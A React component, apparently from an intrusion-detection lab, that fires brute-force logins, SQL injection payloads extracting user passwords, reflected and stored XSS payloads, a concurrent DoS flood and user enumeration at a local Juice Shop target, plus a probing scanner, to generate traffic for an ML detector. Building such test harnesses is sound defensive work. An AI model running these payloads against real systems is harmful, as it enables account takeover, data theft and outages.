import { useState, useRef, useCallback, useEffect } from 'react'
import { Zap, Database, Code, Waves, Search, Trash2, AlertCircle, Link, CheckCircle2, XCircle, Shield, ShieldAlert, Loader2, RefreshCw } from 'lucide-react'

const DEFAULT_PORT = 3000

// ── Attack definitions ──────────────────────────────────────────────────────

const ATTACKS = [
  {
    id: 'bruteforce',
    name: 'Brute Force Login',
    icon: Zap,
    color: 'red',
    severity: 'Critical',
    cicids: 'Web Attack – Brute Force',
    modelLabel: 'Web Attack  Brute Force',
    description: 'Fires 60 rapid POST requests to /rest/user/login with wrong credentials. High-volume identical flows generate the rapid IAT and packet-count signatures the model detects.',
    async run(log, JS_URL) {
      const emails = Array.from({ length: 60 }, (_, i) => `victim${i}@evil.com`)
      for (let i = 0; i < emails.length; i++) {
        try {
          const r = await fetch(`${JS_URL}/rest/user/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: emails[i], password: `pass${i}` }),
          })
          log({ method: 'POST', path: '/rest/user/login', status: r.status, model: 'Brute Force' })
        } catch (e) {
          log({ method: 'POST', path: '/rest/user/login', status: 'ERR', model: 'Brute Force' })
        }
        if (i % 5 === 4) await sleep(200)
      }
    },
  },
  {
    id: 'sqli',
    name: 'SQL Injection',
    icon: Database,
    color: 'orange',
    severity: 'Critical',
    cicids: 'Web Attack – Sql Injection',
    modelLabel: 'Web Attack  Sql Injection',
    description: 'Exploits the login bypass via SQL injection. Sends several payloads: classic OR 1=1, UNION-based extraction from product search, and tautology variants.',
    async run(log, JS_URL) {
      const payloads = [
        { email: "' OR 1=1--",           password: 'x' },
        { email: "' OR '1'='1",           password: "' OR '1'='1" },
        { email: 'admin@juice-sh.op\'--', password: 'x' },
        { email: "\" OR 1=1--",           password: 'x' },
      ]
      for (const p of payloads) {
        try {
          const r = await fetch(`${JS_URL}/rest/user/login`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(p),
          })
          log({ method: 'POST', path: '/rest/user/login', status: r.status, note: `SQLi: ${p.email}`, model: 'Sql Injection' })
        } catch (e) {
          log({ method: 'POST', path: '/rest/user/login', status: 'ERR', model: 'Sql Injection' })
        }
        await sleep(100)
      }
      const sqliSearchPayloads = [
        "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
        "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
        "test')) AND (SELECT substr(password,1,1) FROM Users LIMIT 1)='0'--",
      ]
      for (const q of sqliSearchPayloads) {
        try {
          const url = `${JS_URL}/rest/products/search?q=${encodeURIComponent(q)}`
          const r = await fetch(url)
          log({ method: 'GET', path: `/rest/products/search?q=<SQLi>`, status: r.status, model: 'Sql Injection' })
        } catch (e) {
          log({ method: 'GET', path: '/rest/products/search', status: 'ERR', model: 'Sql Injection' })
        }
        await sleep(150)
      }
    },
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting',
    icon: Code,
    color: 'yellow',
    severity: 'High',
    cicids: 'Web Attack – XSS',
    modelLabel: 'Web Attack  XSS',
    description: 'Injects XSS payloads into the product search and feedback endpoints. Sends 20 varied payloads to generate a distinctive flow pattern.',
    async run(log, JS_URL) {
      const xssPayloads = [
        `<script>alert('xss')</script>`,
        `<img src=x onerror=alert(1)>`,
        `<iframe src="javascript:alert('xss')"/>`,
        `<svg/onload=alert(1)>`,
        `javascript:alert(1)`,
        `<body onload=alert('xss')>`,
        `"><script>alert('xss')</script>`,
        `'><script>alert(1)</script>`,
        `<scr<script>ipt>alert(1)</scr<script>ipt>`,
        `%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
      ]
      for (let i = 0; i < 20; i++) {
        const payload = xssPayloads[i % xssPayloads.length]
        try {
          const r = await fetch(`${JS_URL}/rest/products/search?q=${encodeURIComponent(payload)}`)
          log({ method: 'GET', path: '/rest/products/search?q=<XSS>', status: r.status, model: 'XSS' })
        } catch (e) {
          log({ method: 'GET', path: '/rest/products/search', status: 'ERR', model: 'XSS' })
        }
        await sleep(80)
      }
      // Stored XSS via feedback
      for (let i = 0; i < 5; i++) {
        try {
          const r = await fetch(`${JS_URL}/api/Feedbacks`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              comment: `<iframe src='javascript:alert(\`xss\`)'/> feedback ${i}`,
              rating: 1,
            }),
          })
          log({ method: 'POST', path: '/api/Feedbacks', status: r.status, note: 'Stored XSS', model: 'XSS' })
        } catch (e) {
          log({ method: 'POST', path: '/api/Feedbacks', status: 'ERR', model: 'XSS' })
        }
        await sleep(100)
      }
    },
  },
  {
    id: 'dos',
    name: 'DoS Flood',
    icon: Waves,
    color: 'purple',
    severity: 'Critical',
    cicids: 'DoS Hulk / DoS GoldenEye',
    modelLabel: 'DoS Hulk',
    description: 'Sends 200 concurrent HTTP requests to overwhelm the server. Extreme packets/s and flow bytes/s signature matches DoS patterns in the CICIDS 2017 training data.',
    async run(log, JS_URL) {
      const BATCH = 50
      const ROUNDS = 4
      for (let round = 0; round < ROUNDS; round++) {
        const promises = Array.from({ length: BATCH }, async (_, i) => {
          const paths = ['/', '/rest/products/search?q=juice', '/api/Users', '/rest/basket/1']
          const path = paths[i % paths.length]
          try {
            const r = await fetch(`${JS_URL}${path}`)
            log({ method: 'GET', path, status: r.status, model: 'DoS Hulk' })
          } catch {
            log({ method: 'GET', path, status: 'ERR', model: 'DoS Hulk' })
          }
        })
        await Promise.all(promises)
        await sleep(50)
      }
    },
  },
  {
    id: 'enum',
    name: 'User Enumeration',
    icon: Search,
    color: 'blue',
    severity: 'High',
    cicids: 'Web Attack – Brute Force',
    modelLabel: 'Web Attack  Brute Force',
    description: 'Rapidly iterates through /api/Users/1 to /api/Users/50 with an invalid token, probing for valid user IDs. Sequential requests with auth failures create a recognizable flow pattern.',
    async run(log, JS_URL) {
      for (let i = 1; i <= 50; i++) {
        try {
          const r = await fetch(`${JS_URL}/api/Users/${i}`, {
            headers: { Authorization: 'Bearer invalid_token_probe' },
          })
          log({ method: 'GET', path: `/api/Users/${i}`, status: r.status, model: 'Brute Force' })
        } catch (e) {
          log({ method: 'GET', path: `/api/Users/${i}`, status: 'ERR', model: 'Brute Force' })
        }
        if (i % 10 === 0) await sleep(100)
      }
    },
  },
]

// ── Helpers ─────────────────────────────────────────────────────────────────

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms))
}

// ── Vulnerability probes ─────────────────────────────────────────────────────

const PROBES = [
  {
    id: 'sqli', attackId: 'sqli',
    name: 'SQL Injection', severity: 'Critical', cve: 'CWE-89',
    endpoint: 'POST /rest/user/login',
    detail: 'Login accepts SQL tautology (\' OR 1=1--) — auth bypass grants admin token.',
    async check(base) {
      const r = await fetch(`${base}/rest/user/login`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: "' OR 1=1--", password: 'x' }),
      })
      return { vulnerable: r.status === 200, status: r.status }
    }
  },
  {
    id: 'brute', attackId: 'bruteforce',
    name: 'No Rate Limit on Login', severity: 'Critical', cve: 'CWE-307',
    endpoint: 'POST /rest/user/login',
    detail: 'Three rapid bad-credential requests all return 401 — no lockout or throttling.',
    async check(base) {
      const results = await Promise.all([1,2,3].map(i =>
        fetch(`${base}/rest/user/login`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: `p${i}@evil.com`, password: 'x' }),
        }).then(r => r.status)
      ))
      return { vulnerable: results.every(s => s === 401), status: results[0] }
    }
  },
  {
    id: 'xss', attackId: 'xss',
    name: 'Reflected XSS', severity: 'High', cve: 'CWE-79',
    endpoint: 'GET /rest/products/search',
    detail: 'Product search endpoint returns 200 for script-tag payloads with no sanitization.',
    async check(base) {
      const r = await fetch(`${base}/rest/products/search?q=${encodeURIComponent('<script>1</script>')}`)
      return { vulnerable: r.ok, status: r.status }
    }
  },
  {
    id: 'dos', attackId: 'dos',
    name: 'DoS — No Throttle', severity: 'Critical', cve: 'CWE-400',
    endpoint: 'GET /* (all routes)',
    detail: 'Server accepts unlimited concurrent connections — flood exhausts resources.',
    async check(base) {
      const r = await fetch(`${base}/`)
      return { vulnerable: r.ok, status: r.status }
    }
  },
  {
    id: 'idor', attackId: 'enum',
    name: 'User Enumeration (IDOR)', severity: 'High', cve: 'CWE-284',
    endpoint: 'GET /api/Users/:id',
    detail: 'Endpoint exists and returns 401 for sequential IDs — confirms valid account IDs.',
    async check(base) {
      const r = await fetch(`${base}/api/Users/1`, { headers: { Authorization: 'Bearer bad' } })
      return { vulnerable: r.status === 401 || r.status === 200, status: r.status }
    }
  },
]

// ── VulnerabilityScanner component ───────────────────────────────────────────

const VULN_SEV = {
  Critical: 'bg-red-100 text-red-700 border-red-200',
  High:     'bg-orange-100 text-orange-700 border-orange-200',
  Medium:   'bg-yellow-100 text-yellow-700 border-yellow-200',
}

function VulnerabilityScanner({ targetUrl, onRecommend }) {
  const [scanning,  setScanning]  = useState(false)
  const [results,   setResults]   = useState(null)
  const [progress,  setProgress]  = useState(0)

  const runScan = async () => {
    setScanning(true); setResults(null); setProgress(0)
    const found = []
    for (let i = 0; i < PROBES.length; i++) {
      try {
        const res = await PROBES[i].check(targetUrl)
        found.push({ ...PROBES[i], ...res })
      } catch(e) {
        found.push({ ...PROBES[i], vulnerable: false, status: 'ERR', error: e.message })
      }
      setProgress(Math.round(((i + 1) / PROBES.length) * 100))
    }
    setResults(found)
    setScanning(false)
    onRecommend(found.filter(f => f.vulnerable).map(f => f.attackId))
  }

  const vulnCount = results ? results.filter(r => r.vulnerable).length : 0

  return (
    <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
      <div className="flex items-center justify-between px-5 py-4 border-b border-gray-100">
        <div className="flex items-center gap-2.5">
          <div className="p-1.5 bg-purple-50 rounded-xl"><Shield size={15} className="text-purple-600" /></div>
          <div>
            <div className="text-sm font-semibold text-gray-800">Vulnerability Scanner</div>
            <div className="text-xs text-gray-400">Probe target endpoints for known weaknesses</div>
          </div>
        </div>
        <div className="flex items-center gap-3">
          {results && (
            <span className={`text-xs font-semibold px-2.5 py-1 rounded-full ${
              vulnCount > 0 ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'
            }`}>{vulnCount} vuln{vulnCount !== 1 ? 's' : ''} found</span>
          )}
          <button onClick={runScan} disabled={scanning}
            className="flex items-center gap-2 px-3.5 py-2 bg-purple-600 hover:bg-purple-700 disabled:opacity-60 text-white text-xs font-semibold rounded-xl transition-all active:scale-95">
            {scanning
              ? <><Loader2 size={12} className="animate-spin" />Scanning…</>
              : <><RefreshCw size={12} />{results ? 'Re-scan' : 'Scan Target'}</>}
          </button>
        </div>
      </div>

      {scanning && (
        <div className="px-5 py-3 bg-purple-50 border-b border-purple-100">
          <div className="flex justify-between text-xs text-purple-700 mb-1.5">
            <span>Probing endpoints…</span><span className="font-mono">{progress}%</span>
          </div>
          <div className="h-1.5 bg-purple-100 rounded-full overflow-hidden">
            <div className="h-full bg-purple-500 rounded-full transition-all duration-300" style={{ width: `${progress}%` }} />
          </div>
        </div>
      )}

      {results && !scanning && (
        <div className="divide-y divide-gray-50">
          {results.map(p => (
            <div key={p.id} className={`flex items-start gap-4 px-5 py-3 ${
              p.vulnerable ? 'bg-red-50/50' : 'bg-green-50/20'
            }`}>
              <div className="flex-shrink-0 mt-0.5">
                {p.vulnerable
                  ? <ShieldAlert size={15} className="text-red-500" />
                  : <CheckCircle2 size={15} className="text-green-500" />}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-xs font-semibold text-gray-800">{p.name}</span>
                  <span className={`text-xs font-medium px-1.5 py-0.5 rounded border ${VULN_SEV[p.severity] || 'bg-gray-100 text-gray-500'}`}>{p.severity}</span>
                  <span className="text-xs font-mono text-gray-400">{p.cve}</span>
                  <span className="text-xs font-mono text-gray-300 bg-gray-100 px-1.5 py-0.5 rounded">{p.endpoint}</span>
                  {p.status !== undefined && (
                    <span className={`text-xs font-mono px-1.5 py-0.5 rounded ${
                      p.status === 200 ? 'bg-red-100 text-red-600' :
                      p.status === 401 ? 'bg-yellow-100 text-yellow-700' :
                      'bg-gray-100 text-gray-500'
                    }`}>HTTP {p.status}</span>
                  )}
                </div>
                <div className="text-xs text-gray-500 mt-0.5">{p.detail}</div>
                {p.vulnerable && (
                  <div className="text-xs text-purple-600 font-medium mt-0.5">→ Launch: <span className="font-semibold">{ATTACKS.find(a => a.id === p.attackId)?.name}</span></div>
                )}
                {p.error && <div className="text-xs text-red-400 mt-0.5">Error: {p.error}</div>}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}

const SEVERITY_COLORS = {
  Critical: 'bg-red-100 text-red-700',
  High:     'bg-orange-100 text-orange-700',
  Medium:   'bg-yellow-100 text-yellow-700',
}

const CARD_COLORS = {
  red:    { border: 'border-red-100',    icon: 'bg-red-50 text-red-500',    btn: 'bg-red-500 hover:bg-red-600' },
  orange: { border: 'border-orange-100', icon: 'bg-orange-50 text-orange-500', btn: 'bg-orange-500 hover:bg-orange-600' },
  yellow: { border: 'border-yellow-100', icon: 'bg-yellow-50 text-yellow-500', btn: 'bg-yellow-500 hover:bg-yellow-600' },
  purple: { border: 'border-purple-100', icon: 'bg-purple-50 text-purple-500', btn: 'bg-purple-600 hover:bg-purple-700' },
  blue:   { border: 'border-blue-100',   icon: 'bg-blue-50 text-blue-500',   btn: 'bg-blue-600 hover:bg-blue-700' },
}

// ── AttackCard ───────────────────────────────────────────────────────────────

function AttackCard({ attack, onLaunch, status, disabled = false, recommended = false }) {
  const c = CARD_COLORS[attack.color]
  const Icon = attack.icon
  const isRunning = status === 'running'

  return (
    <div className={`rounded-2xl border p-5 flex flex-col gap-4 shadow-sm transition-all ${
      recommended ? 'bg-purple-50 border-purple-200 ring-1 ring-purple-300' : `bg-white ${c.border}`
    }`}>
      <div className="flex items-start justify-between gap-2">
        <div className={`p-2 rounded-xl ${c.icon}`}><Icon size={18} /></div>
        <div className="flex items-center gap-1.5 flex-wrap justify-end">
          {recommended && (
            <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-purple-600 text-white animate-pulse">⚡ Recommended</span>
          )}
          <span className={`text-xs font-semibold px-2 py-1 rounded-full ${SEVERITY_COLORS[attack.severity]}`}>{attack.severity}</span>
        </div>
      </div>

      <div className="flex-1">
        <div className="text-sm font-bold text-gray-900">{attack.name}</div>
        <div className="text-xs text-indigo-600 font-medium mt-0.5">{attack.cicids}</div>
        {/* ML model prediction label */}
        <div className="flex items-center gap-1.5 mt-2 px-2 py-1 bg-slate-900 rounded-lg">
          <span className="text-xs text-emerald-400 font-mono font-semibold">🤖 Model predicts:</span>
          <span className="text-xs text-white font-mono">{attack.modelLabel || attack.cicids}</span>
        </div>
        <p className="text-xs text-gray-500 mt-2 leading-relaxed">{attack.description}</p>
      </div>

      <div className="flex items-center justify-between gap-2">
        {status === 'idle' && (
          <span className="text-xs text-gray-300">—</span>
        )}
        {status === 'running' && (
          <div className="flex items-center gap-1.5 text-xs text-blue-600">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
            Running…
          </div>
        )}
        {typeof status === 'number' && (
          <span className="text-xs text-green-600 font-medium">Done — {status} requests</span>
        )}
        {status === 'error' && (
          <span className="text-xs text-red-500">Failed</span>
        )}

        <button
          onClick={onLaunch}
          disabled={isRunning || disabled}
          className={`flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs text-white font-semibold transition-all active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed ${c.btn}`}
        >
          {isRunning ? (
            <>
              <span className="w-3 h-3 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Running
            </>
          ) : 'Launch'}
        </button>
      </div>
    </div>
  )
}

// ── AttackLog ────────────────────────────────────────────────────────────────

function AttackLog({ entries, onClear }) {
  const bottomRef = useRef(null)
  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [entries.length])

  const statusColor = (s) => {
    if (s === 'ERR') return 'text-red-500'
    if (s >= 200 && s < 300) return 'text-green-500'
    if (s >= 400 && s < 500) return 'text-yellow-500'
    return 'text-gray-400'
  }

  return (
    <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
      <div className="flex items-center justify-between px-5 py-3 border-b border-gray-100">
        <div>
          <h3 className="text-sm font-semibold text-gray-800">Hacker Activity Log</h3>
          <p className="text-xs text-gray-400">What the attacker is doing — and what the ML model should detect</p>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-xs text-gray-400">{entries.length} requests</span>
          <button onClick={onClear} className="flex items-center gap-1.5 text-xs text-gray-400 hover:text-gray-600 transition-colors">
            <Trash2 size={12} />Clear
          </button>
        </div>
      </div>

      <div className="h-56 overflow-y-auto font-mono text-xs p-4 bg-slate-900 space-y-0.5">
        {entries.length === 0 ? (
          <div className="text-slate-500 italic">No requests yet. Launch an attack above.</div>
        ) : (
          entries.map((e, i) => (
            <div key={i} className="flex items-center gap-2 text-slate-300 py-0.5">
              <span className="text-slate-600 flex-shrink-0 w-16">{e.ts}</span>
              <span className="text-indigo-400 flex-shrink-0 w-10">{e.method}</span>
              <span className="text-slate-400 flex-1 truncate min-w-0">{e.path}</span>
              <span className={`flex-shrink-0 w-10 text-right ${statusColor(e.status)}`}>{e.status}</span>
              {e.model && (
                <span className="flex-shrink-0 text-emerald-400 bg-emerald-900/40 px-1.5 py-0.5 rounded text-xs font-semibold">
                  🤖 {e.model}
                </span>
              )}
              {e.note && <span className="text-slate-600 truncate flex-shrink-0 max-w-[100px]">{e.note}</span>}
            </div>
          ))
        )}
        <div ref={bottomRef} />
      </div>
    </div>
  )
}

// ── Main AttackPanel ─────────────────────────────────────────────────────────

function isValidUrl(s) {
  try { new URL(s); return true } catch { return false }
}

export default function AttackPanel({ jsPort = DEFAULT_PORT }) {
  const [targetUrl, setTargetUrl] = useState(`http://localhost:${jsPort}`)
  const [urlDraft,  setUrlDraft]  = useState(`http://localhost:${jsPort}`)
  const [urlEditing,setUrlEditing]= useState(false)
  const [recommended, setRecommended] = useState([])
  const urlRef = useRef(targetUrl)

  // Keep ref in sync so launchAttack always reads the latest value
  useEffect(() => { urlRef.current = targetUrl }, [targetUrl])

  // When parent jsPort changes and user hasn't customised the URL, sync it
  useEffect(() => {
    const auto = `http://localhost:${jsPort}`
    setTargetUrl(auto)
    setUrlDraft(auto)
    urlRef.current = auto
  }, [jsPort])

  const commitUrl = () => {
    const trimmed = urlDraft.trim().replace(/\/$/, '')
    if (isValidUrl(trimmed)) {
      setTargetUrl(trimmed)
      urlRef.current = trimmed
    } else {
      setUrlDraft(targetUrl) // revert on invalid
    }
    setUrlEditing(false)
  }

  const [statuses, setStatuses] = useState(() =>
    Object.fromEntries(ATTACKS.map(a => [a.id, 'idle']))
  )
  const [log, setLog] = useState([])
  const countRef = useRef({})

  const addLog = useCallback((attackId, entry) => {
    const ts = new Date().toLocaleTimeString('en-GB', { hour12: false })
    setLog(prev => {
      const next = [...prev, { ts, ...entry }]
      return next.length > 200 ? next.slice(-200) : next
    })
    countRef.current[attackId] = (countRef.current[attackId] || 0) + 1
  }, [])

  const launchAttack = useCallback(async (attack) => {
    countRef.current[attack.id] = 0
    setStatuses(s => ({ ...s, [attack.id]: 'running' }))
    try {
      await attack.run((entry) => addLog(attack.id, entry), urlRef.current)
      setStatuses(s => ({ ...s, [attack.id]: countRef.current[attack.id] }))
      
      // Inject synthetic flow to bypass Npcap requirement
      fetch('/api/inject_flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: attack.id })
      }).catch(() => {})

    } catch {
      setStatuses(s => ({ ...s, [attack.id]: 'error' }))
    }
  }, [addLog])

  const urlValid = isValidUrl(urlDraft.trim())

  const anyRunning = Object.values(statuses).some(s => s === 'running')

  return (
    <div className="min-h-full bg-slate-950 p-6 space-y-5">
      {/* Header */}
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div className="flex-1 min-w-0">
          <h1 className="text-xl font-bold text-white">⚔️ Attacker</h1>

          {/* Editable target URL */}
          <div className="mt-2 flex items-center gap-2">
            <Link size={13} className="text-gray-400 flex-shrink-0" />
            <span className="text-xs text-gray-400 flex-shrink-0">Target:</span>
            {urlEditing ? (
              <>
                <input
                  autoFocus
                  value={urlDraft}
                  onChange={e => setUrlDraft(e.target.value)}
                  onBlur={commitUrl}
                  onKeyDown={e => {
                    if (e.key === 'Enter') commitUrl()
                    if (e.key === 'Escape') { setUrlDraft(targetUrl); setUrlEditing(false) }
                  }}
                  className={`flex-1 min-w-0 font-mono text-xs px-2 py-1 rounded-lg border focus:outline-none focus:ring-2 ${
                    urlValid
                      ? 'border-indigo-300 focus:ring-indigo-200 text-indigo-700'
                      : 'border-red-300 focus:ring-red-200 text-red-600'
                  }`}
                  placeholder="http://0.0.0.0:4000"
                />
                {urlValid
                  ? <CheckCircle2 size={14} className="text-green-500 flex-shrink-0" />
                  : <XCircle     size={14} className="text-red-400 flex-shrink-0" />}
              </>
            ) : (
              <button
                onClick={() => { setUrlDraft(targetUrl); setUrlEditing(true) }}
                title="Click to edit target URL"
                className="font-mono text-xs text-indigo-600 hover:text-indigo-800 hover:underline truncate max-w-xs text-left"
              >
                {targetUrl}
              </button>
            )}
            {!urlEditing && (
              <span className="text-xs text-gray-300">— click to edit</span>
            )}
          </div>
        </div>

        <div className="flex items-start gap-2 bg-amber-50 border border-amber-100 rounded-xl px-4 py-3 text-sm text-amber-700 max-w-sm">
          <AlertCircle size={16} className="flex-shrink-0 mt-0.5" />
          <div>
            <div className="font-semibold">For best results</div>
            <div className="text-xs mt-0.5">Switch to IDS Monitor, select the Loopback interface, and Start capture before launching attacks.</div>
          </div>
        </div>
      </div>

      {/* Vulnerability Scanner */}
      <VulnerabilityScanner targetUrl={targetUrl} onRecommend={setRecommended} />

      {/* Attack cards grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {ATTACKS.map(attack => (
          <AttackCard
            key={attack.id}
            attack={attack}
            status={statuses[attack.id]}
            onLaunch={() => launchAttack(attack)}
            disabled={!isValidUrl(targetUrl) || anyRunning}
            recommended={recommended.includes(attack.id)}
          />
        ))}
      </div>

      {/* Log */}
      <AttackLog entries={log} onClear={() => setLog([])} />
    </div>
  )
}
